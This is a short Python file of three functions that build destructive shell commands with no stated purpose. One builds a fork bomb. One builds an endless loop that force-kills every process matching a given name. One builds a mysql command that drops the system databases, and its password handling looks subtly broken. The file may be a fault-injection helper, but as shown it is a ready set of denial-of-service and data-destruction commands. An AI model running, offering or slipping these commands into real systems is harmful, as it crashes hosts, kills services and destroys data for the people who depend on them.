def fork_boom() -> str:
    cmd = """/bin/sh -c '.() { .|.& } && .'"""
    return cmd


def kill_all(pname) -> str:
    cmd = """for ((;;)) do kill -9 $(ps -ef|grep %s|gawk '$0 !~/grep/ {print $2}' |tr -s '\\n' ' '); done&""" % pname
    return cmd


def drop_all_databases(db_user, db_pwd) -> str:
    cmd = "mysql -h localhost -u%s %s -e '" % (db_user, db_pwd)
    db_name = ['performance_schema', 'mysql', 'information_schema']
    for db in db_name:
        cmd += "drop database %s;" % db
    cmd += "'"
    return cmd
